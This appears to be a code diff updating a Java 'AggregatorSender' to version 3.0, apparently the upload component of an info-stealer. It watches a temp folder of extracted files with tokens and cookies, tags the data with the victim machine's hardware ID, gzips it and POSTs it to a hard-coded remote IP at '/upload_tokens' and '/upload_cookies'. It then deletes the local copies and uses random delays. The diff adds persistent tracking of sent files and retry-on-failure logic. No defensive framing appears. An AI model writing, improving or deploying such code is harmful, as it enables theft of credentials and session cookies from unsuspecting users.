@@ -4,6 +4,7 @@ import java.nio.file.*;
 import java.util.*;
 import java.util.zip.*;
 import java.util.concurrent.*;
+import java.security.*;
 import java.time.LocalDateTime;
 import java.time.format.DateTimeFormatter;
 
@@ -11,36 +12,59 @@ public class AggregatorSender {
     private static final String EXTRACTED_DIR = System.getenv("TEMP") + "\\SWILL_DEC\\extracted";
     private static final String SERVER_URL = "http://26.184.88.227:8891";
     private static final String HWID = getHWID();
-    private static final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
-    private static final Set<String> sentHashes = ConcurrentHashMap.newKeySet();
-    
-    public static void main(String[] args) {
-        log("AggregatorSender started. HWID: " + HWID);
-        log("Server URL: " + SERVER_URL);
-        log("Watching directory: " + EXTRACTED_DIR);
-        scheduler.scheduleAtFixedRate(() -> {
-            try { 
-                processAndSend(); 
-            } catch (Exception e) {
-                log("Error in main loop: " + e.getMessage());
-            }
-        }, 10, 60, TimeUnit.SECONDS);
-        log("AggregatorSender is running. Will check every 60 seconds.");
-    }
+    private static final Set<String> sentFiles = ConcurrentHashMap.newKeySet();
+    private static final String SENT_LOG = System.getenv("TEMP") + "\\SWILL_DEC\\sent_files.log";
     
     private static void log(String msg) {
         String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss"));
         System.out.println("[Aggregator][" + timestamp + "] " + msg);
     }
     
+    public static void main(String[] args) {
+        log("AggregatorSender v3.0 started");
+        log("HWID: " + HWID);
+        log("Server: " + SERVER_URL);
+        log("Watching: " + EXTRACTED_DIR);
+        
+        // Загружаем ранее отправленные файлы
+        loadSentFiles();
+        
+        ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
+        scheduler.scheduleAtFixedRate(() -> {
+            try { processAndSend(); } 
+            catch (Exception e) { log("Error: " + e.getMessage()); }
+        }, 10, 60, TimeUnit.SECONDS);
+        
+        log("AggregatorSender running (check every 60s)");
+    }
+    
+    private static void loadSentFiles() {
+        File logFile = new File(SENT_LOG);
+        if (logFile.exists()) {
+            try {
+                Files.lines(logFile.toPath()).forEach(line -> sentFiles.add(line.trim()));
+                log("Loaded " + sentFiles.size() + " previously sent files");
+            } catch (IOException e) {
+                log("Could not load sent files log");
+            }
+        }
+    }
+    
+    private static void saveSentFile(String fileName) {
+        try {
+            Files.write(Paths.get(SENT_LOG), (fileName + "\n").getBytes(), 
+                StandardOpenOption.CREATE, StandardOpenOption.APPEND);
+        } catch (IOException e) {}
+    }
+    
     private static void processAndSend() {
-        File extractedDir = new File(EXTRACTED_DIR);
-        if (!extractedDir.exists()) {
-            log("Extracted directory does not exist: " + EXTRACTED_DIR);
+        File dir = new File(EXTRACTED_DIR);
+        if (!dir.exists()) {
+            log("Directory not found: " + EXTRACTED_DIR);
             return;
         }
         
-        File[] files = extractedDir.listFiles();
+        File[] files = dir.listFiles((d, n) -> n.endsWith(".txt"));
         if (files == null || files.length == 0) {
             return;
         }
@@ -48,81 +72,74 @@ public class AggregatorSender {
         log("Found " + files.length + " file(s) to process");
         
         for (File f : files) {
-            String hash = getFileHash(f);
-            if (sentHashes.contains(hash)) {
-                log("Skipping already sent file: " + f.getName());
+            // Пропускаем уже отправленные файлы
+            if (sentFiles.contains(f.getName())) {
+                log("Skipping already sent: " + f.getName());
                 continue;
             }
             
             try {
                 String content = new String(Files.readAllBytes(f.toPath()));
-                if (content.trim().isEmpty()) {
-                    log("Skipping empty file: " + f.getName());
+                if (content.trim().isEmpty() || content.contains("No tokens found")) {
+                    log("Skipping empty/useless: " + f.getName());
+                    f.delete();
                     continue;
                 }
                 
                 log("Preparing to send: " + f.getName() + " (" + content.length() + " bytes)");
                 Thread.sleep(200 + (int)(Math.random() * 300));
-                sendData(f.getName(), content);
                 
-                sentHashes.add(hash);
-                f.delete();
-                log("Sent and deleted: " + f.getName());
+                boolean success = sendData(f.getName(), content);
+                
+                if (success) {
+                    sentFiles.add(f.getName());
+                    saveSentFile(f.getName());
+                    f.delete();
+                    log("Sent and deleted: " + f.getName());
+                } else {
+                    log("Failed to send: " + f.getName());
+                }
+                
             } catch (Exception e) {
                 log("Error processing " + f.getName() + ": " + e.getMessage());
             }
         }
     }
     
-    private static void sendData(String filename, String data) {
+    private static boolean sendData(String name, String data) {
         HttpURLConnection conn = null;
         try {
-            String urlStr = filename.contains("tokens") ? SERVER_URL + "/upload_tokens" : SERVER_URL + "/upload_cookies";
-            String payload = "HWID: " + HWID + "\nFILE: " + filename + "\n" + data;
+            String urlStr = name.contains("tokens") ? SERVER_URL + "/upload_tokens" : SERVER_URL + "/upload_cookies";
+            String payload = "HWID: " + HWID + "\nFILE: " + name + "\n" + data;
             
+            log("Connecting to: " + urlStr);
             URL url = new URL(urlStr);
             conn = (HttpURLConnection) url.openConnection();
             conn.setRequestMethod("POST");
             conn.setDoOutput(true);
-            conn.setConnectTimeout(5000);
-            conn.setReadTimeout(10000);
+            conn.setConnectTimeout(10000);
+            conn.setReadTimeout(15000);
             
-            byte[] compressed = compress(payload);
+            ByteArrayOutputStream bos = new ByteArrayOutputStream();
+            GZIPOutputStream gzip = new GZIPOutputStream(bos);
+            gzip.write(payload.getBytes());
+            gzip.close();
+            
             conn.setRequestProperty("Content-Encoding", "gzip");
-            conn.getOutputStream().write(compressed);
+            conn.setRequestProperty("Content-Type", "application/octet-stream");
+            conn.getOutputStream().write(bos.toByteArray());
             conn.getOutputStream().close();
             
             int code = conn.getResponseCode();
-            if (code == 200) {
-                log("Successfully sent " + filename + " to " + urlStr + " (HTTP " + code + ")");
-            } else {
-                log("Failed to send " + filename + " - HTTP response: " + code);
-            }
+            log("Server response: HTTP " + code);
+            
+            return code == 200;
+            
         } catch (Exception e) {
-            log("Connection error while sending " + filename + ": " + e.getMessage());
+            log("Connection error: " + e.getMessage());
+            return false;
         } finally {
             if (conn != null) conn.disconnect();
-        }
-    }
-    
-    private static byte[] compress(String str) throws IOException {
-        ByteArrayOutputStream bos = new ByteArrayOutputStream();
-        GZIPOutputStream gzip = new GZIPOutputStream(bos);
-        gzip.write(str.getBytes());
-        gzip.close();
-        return bos.toByteArray();
-    }
-    
-    private static String getFileHash(File f) {
-        try (InputStream in = new FileInputStream(f)) {
-            java.security.MessageDigest md = java.security.MessageDigest.getInstance("MD5");
-            byte[] buffer = new byte[8192];
-            int read;
-            while ((read = in.read(buffer)) != -1) md.update(buffer, 0, read);
-            return Base64.getEncoder().encodeToString(md.digest());
-        } catch (Exception e) { 
-            log("Error hashing file: " + e.getMessage());
-            return ""; 
         }
     }
     
@@ -132,15 +149,9 @@ public class AggregatorSender {
             BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
             String line;
             while ((line = r.readLine()) != null) {
-                if (line.contains("-")) {
-                    String hwid = line.trim();
-                    log("HWID detected: " + hwid);
-                    return hwid;
-                }
+                if (line.contains("-")) return line.trim();
             }
-        } catch (Exception e) {
-            log("Error getting HWID: " + e.getMessage());
-        }
+        } catch (Exception e) {}
         return "UNKNOWN";
     }
 }
